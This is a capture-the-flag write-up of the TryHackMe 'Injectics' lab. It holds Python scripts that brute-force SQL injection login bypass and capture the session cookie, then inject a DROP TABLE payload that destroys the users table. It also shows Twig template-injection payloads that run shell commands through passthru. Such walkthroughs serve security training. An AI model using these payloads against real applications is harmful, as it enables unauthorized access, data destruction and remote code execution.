## THM CTF - Injectics

We can start changing local DNS to easily handle all the process.
```
sudo nano /etc/hosts
```
Add the record:
```
xxx.xxx.xxx.xxx	   injectics.thm
```
Now we can proceed with an ```Nmap``` scan.
```
nmap -sS -T4 -p22,80 -sV -sC injectics.thm
```
We’ve found two open ports, but for now, we’re focusing on HTTP. We’ll leave the SSH port open for later if we need it.

We can ignore all other ```Nmap``` scans for now because we need to test a web application. However, the scan reveals that the ```HTTPOnly``` flag for cookies isn’t set.

We can use a ```Gobuster``` scan to enumerate any hidden directory:
```
gobuster dir -u http://injectics.thm -w /usr/share/wordlists/dirb/common.txt -x html,js,txt,php,db,json,log
```
This scan reveals a file named ```mail.log``` containing some credentials. The mail message states that if the database gets corrupted, there are some credentials that can be used to access the system.
```
| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |
```
This is our objective for now, corrupt the database.

There are 2 login pages:
* ```login.php``` is protected against basic SQL injection attempts by a script. This script uses the ```Ajax GET method``` to retrieve responses from the server after our input, from a page named ```functions.php```. While reading the script closely, we can identify the landing page in case of correct credentials, which was already highlighted by ```Gobuster``` as ```dashboard.php```.
* ```adminLogin007.php``` is not protected by basic SQLi attack while not redirecting anywhere after our input.

We can try to inject some payload through ```functions.php``` with the help of ```BurpSuite``` and an already composed payload downloaded from [GitHub](https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt).

We can do it at a faster rate thanks to a Python script.

<details>
<summary><h3>THM_Injectics_SQLi_brute.py</h3></summary>
  
```python

import requests
import string

# Set URL and main variables
url_brute = 'http://injectics.thm/functions.php'
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
}
file_path = '/home/kali/Downloads/SQLi.txt'

# Start a new session
session = requests.Session()

#Try to read the file content then execute the attack
try:
    with open(file_path, 'r') as file:
        for item in file:

# Create Payload based on the payload selected line by line
            payload={
                "username" : item.strip(),
                "password" : "admin",
                "function" : "login"
            }

# Send the request
            response = session.post(url_brute, headers=headers, data=payload)

# Check for the correct response and print the output in the terminal
            if response.json()['status'] != 'error':
                print(f"Access Granted with this payload: {item.strip()}")
                print(f"Use this session Cookie: {session.cookies['PHPSESSID']}")
                break
except FileNotFoundError:
    print(f"File not found: {file_path}")

```
  
</details>

We obtain a valid session with:
```
' OR 'x'='x'#;
```
Json response:
```
{"status":"success","message":"Login successful","is_admin":"true","first_name":"dev","last_name":"dev","redirect_link":"dashboard.php?isadmin=false"}
```

With the same ```Cookie``` used to execute the attack, we can access to the ```dashboard.php``` page as a DEV.

Now we can try to drop the database.

In the dashboard we can edit some more fields (like gold, silver and bronze of the list), so we try another brute-force attack in search for ```SQLi``` vulnerability.

We can use ```BurpSuite``` or previous Python code extended.

<details>
<summary><h3>THM_Injectics_SQLi_brute.py (Complete)</h3></summary>
  
```python

import requests
import string

# Set URL and main variables
url_brute = 'http://injectics.thm/functions.php'
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
}
file_path = '/home/kali/Downloads/SQLi.txt'

# Start a new session
session = requests.Session()

#Try to read the file content then execute the attack
try:
    with open(file_path, 'r') as file:
        for item in file:

# Create Payload based on the payload selected line by line
            payload={
                "username" : item.strip(),
                "password" : "admin",
                "function" : "login"
            }

# Send the request
            response = session.post(url_brute, headers=headers, data=payload)

# Check for the correct response and print the output in the terminal
            if response.json()['status'] != 'error':
                print(f"Access Granted with this payload: {item.strip()}")
                print(f"Use this session Cookie: {session.cookies['PHPSESSID']}")
                break
except FileNotFoundError:
    print(f"File not found: {file_path}")


# After Obtaining a valid session we can attack the inner page
# Define new variables
inner_url = 'http://injectics.thm/edit_leaderboard.php'
logout_url = 'http://injectics.thm/logout.php'

#Try to read the file content then execute the attack
try:
    with open(file_path, 'r') as file:
        for item in file:

# Create Payload based on the payload selected line by line
            payload={
                "rank": "1",
                "country": "USA",
                "gold": item.strip(),
                "silver": "21",
                "bronze": "12345"
            }

# It seems that all the headers value need to be filled for the request to be successful
            headers = {
                    'Host': 'injectics.thm',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': '46',
                    'Origin': 'http://injectics.thm',
                    'DNT': '1',
                    'Sec-GPC': '1',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Priority': 'u=0, i'
                }
# Send the request
            response = session.post(inner_url, headers=headers, data=payload)

# Check for the correct response and print the output in the terminal
            if 'Error updating data' not in response.text and 'Welcome to the Injectics 2024' not in response.text:
                print(f"Payload found: {item.strip()}")

# Then try to drop the Database if the first attack is successful
                print(f"Try to drop database...")

# Craft the correct payload
                payload='rank=1&country=&gold=23;DROP+Table+users;&silver=21&bronze=12345'

# Send the payload and check if the database is correctly dropped
                response = session.post(inner_url, headers=headers, data=payload)
                if 'important table' in response.text:
                    print(f"Good Job! Database Dropped")
                break
except FileNotFoundError:
    print(f"File not found: {file_path}")

```
  
</details>

We find that in the private area there is no protection against basic ```SQLi``` like:
```
or 1=1
```
So we try to drop the database via ```BurpSuite``` changing the value of ```gold``` variable to:
```
23;DROP+Table+users;
```
After logging out, we encounter an error message indicating a database malfunction. 

***All these phases are handled by the Python script.***

However, after a brief wait, we can attempt to log in again using the credentials we previously found, successfully gaining access to the Admin page via:
```
http://injectics.thm/adminLogin007.php
```
In the Admin page there is the first flag and a ```Profile``` page where we can test something else.

Previously while we enumerate folders with ```Gobuster```, we found a file ```composer.json``` that tells us that the ```Template Engine``` used in the making of this site is ```Twig```.

We can try to submit the payload in the ```First Name``` of the profile:
```
{{7*7}}
```
We then navigate to the main page to discover that our welcome message changed to ```Welcome, 49!```

So we can test others payload to discover the content of ```flags``` folder (discovered with ```Gobuster```). Thanks to [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md#twig---code-execution) we can find the other flag.
```
{{['ls',""]|sort('passthru')}}
{{['ls flags',""]|sort('passthru')}}
{{['cat+flags/***************************.txt',""]|sort('passthru')}}
```
